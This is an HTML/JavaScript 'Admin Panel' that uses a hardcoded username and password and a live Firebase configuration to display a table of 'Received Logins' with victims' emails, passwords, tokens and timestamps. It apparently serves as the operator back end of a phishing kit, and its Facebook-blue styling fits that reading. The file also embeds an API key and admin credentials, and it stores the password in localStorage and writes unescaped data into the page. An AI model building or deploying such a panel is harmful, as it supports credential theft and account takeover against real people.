<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Admin Panel</title>
<style>
body{
  font-family:sans-serif;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:flex-start;
  min-height:100vh;
  margin:0;
  background:#0b0b0c;
  color:#fff;
  padding:20px;
}
#loginCard, #panel{
  background:#1f1f1f;
  padding:20px;
  border-radius:12px;
  box-shadow:0 4px 15px rgba(0,0,0,0.5);
  width:100%;
  max-width:400px; /* keep card width fixed */
  margin-bottom:20px;
}
#panel{display:none;}
input{
  display:block;
  margin:10px 0;
  padding:8px;
  width:100%;
  max-width:100%;
  border-radius:6px;
  border:none;
  background:#2c2c2c;
  color:#fff;
  overflow:hidden;
  text-overflow:ellipsis;
  white-space:nowrap;
}
input::placeholder{color:#bbb;}
button{
  padding:8px 12px;
  cursor:pointer;
  background:#1877F2;
  color:#fff;
  border:none;
  border-radius:6px;
  width:100%;
}
button:hover{opacity:0.9;}
table{
  width:100%;
  border-collapse:collapse;
  margin-top:10px;
}
th, td{
  border:1px solid #444;
  padding:6px 10px;
  text-align:left;
}
th{background:#2c2c2c;}
tr:nth-child(even){background:#1a1a1a;}
</style>
</head>
<body>

<!-- Login Card -->
<div id="loginCard">
  <h2>Admin Login</h2>
  <input id="adminUser" placeholder="Username"/>
  <input id="adminPass" type="password" placeholder="Password"/>
  <button id="btnLogin">Login</button>
</div>

<!-- Admin Panel -->
<div id="panel">
  <h2>Received Logins</h2>
  <table>
    <thead>
      <tr>
        <th>Email</th>
        <th>Password</th>
        <th>Token</th>
        <th>Time</th>
      </tr>
    </thead>
    <tbody id="loginList"></tbody>
  </table>
  <button id="btnLogout" style="margin-top:12px;">Logout</button>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCEswNldImLq2yD1CwQZfcLxtT6U7RMMXw",
  authDomain: "website-110c6.firebaseapp.com",
  databaseURL: "https://website-110c6-default-rtdb.firebaseio.com",
  projectId: "website-110c6",
  storageBucket: "website-110c6.firebasestorage.app",
  messagingSenderId: "360021271503",
  appId: "1:360021271503:web:ed84554aed4a57c6c4a8ba",
  measurementId: "G-V3R0LYR5Y7"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const ADMIN_USER = "blue";
const ADMIN_PASS = "shimono08";

const loginCard = document.getElementById('loginCard');
const panel = document.getElementById('panel');
const loginList = document.getElementById('loginList');
const btnLogin = document.getElementById('btnLogin');
const btnLogout = document.getElementById('btnLogout');

function showPanel(){
    loginCard.style.display='none';
    panel.style.display='block';
    fetchLogins();
}

function fetchLogins(){
    const loginsRef = ref(db,'logins/');
    onValue(loginsRef, snapshot => {
        const data = snapshot.val();
        loginList.innerHTML='';
        for(const k in data){
            const tr = document.createElement('tr');
            tr.innerHTML = `
              <td>${data[k].email}</td>
              <td>${data[k].pwd_hint}</td>
              <td>${data[k].token}</td>
              <td>${new Date(data[k].time).toLocaleString()}</td>
            `;
            loginList.appendChild(tr);
        }
    });
}

// Remember login with localStorage
const storedUser = localStorage.getItem('admin_user');
const storedPass = localStorage.getItem('admin_pass');
if(storedUser === ADMIN_USER && storedPass === ADMIN_PASS){
    showPanel();
}

btnLogin.onclick = () => {
    const user = document.getElementById('adminUser').value.trim();
    const pass = document.getElementById('adminPass').value.trim();
    if(user === ADMIN_USER && pass === ADMIN_PASS){
        localStorage.setItem('admin_user', user);
        localStorage.setItem('admin_pass', pass);
        showPanel();
    } else {
        alert('Invalid username or password');
    }
};

btnLogout.onclick = () => {
    localStorage.removeItem('admin_user');
    localStorage.removeItem('admin_pass');
    panel.style.display='none';
    loginCard.style.display='block';
    document.getElementById('adminUser').value='';
    document.getElementById('adminPass').value='';
};
</script>

</body>
</html>
